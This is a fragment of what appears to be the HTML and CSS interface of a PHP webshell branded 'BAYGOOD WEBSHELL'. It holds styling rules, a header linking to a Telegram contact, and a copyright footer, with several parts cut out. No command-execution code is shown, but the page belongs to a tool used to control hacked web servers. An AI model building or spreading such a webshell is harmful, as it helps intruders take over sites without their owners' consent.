...
<title>BAYGOOD WEBSHELL</title>
<style> @import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
.bg-dark { background-color: black; }
.border { border: 2px solid white!important; border-radius: 0.75rem!important; background-color: transparent; color: white; padding-left: 1rem; }
.table>tbody>tr>* { color: #007fff; vertical-align: middle; border: 2px solid #FFD700; }
.table thead th { vertical-align: bottom; border: 2px solid white; color: #31ed06; }
...
button, input:hover { border: 2px solid white;border-radius: 0.5rem;font-size: 1rem;cursor: pointer; }
.ohct { padding-left: 1rem; padding-right: 1rem; color: white; border: 2px solid #31ed06; border-radius: 5px; background-color: black; }
.ohct:hover { border: 2px solid #FFD700; color: white; }
.combet { color: white; }
.combet:hover { color: #31ed06; }
</style>
<style>
.fa {padding: 10px;font-size: 20px;width: 50px;text-align: center;text-decoration: none;margin: 5px;border-radius: 5px;border: 2px solid white;background: transparent;}
...
<div class="table-responsive text-light" style="border: 2px solid #FFD700;text-align: left;padding: 0.25rem;border-radius: 0.75rem;">
<div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
<a href="https://t.me/zeanta6" class="fa fa-envelope"></a>
<a href="https://t.me/zeanta6" class="fa fa-facebook"></a>
<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px red;"><span>BAYGOOD WEBSHELL</span></a>
<a href="https://t.me/zeanta6" class="fa fa-whatsapp"></a>
<a href="https://t.me/zeanta6" class="fa fa-telegram"></a> 
</div>
...
<div style="border: 2px solid #FFD700;border-radius: 0.75rem;padding: 0.25rem;margin-top: 0.20rem;margin-bottom: 0.25rem;font-family: 'Kelly Slab';">
...
<font>&copy; Copyright 2025</font>
<font style="color: white;">BAYGOOD</font>
<font>Powered by </font>
<font style="color: white;">GOOD TEAM</font>
</h5>
<?php mR: ?> 
</article>
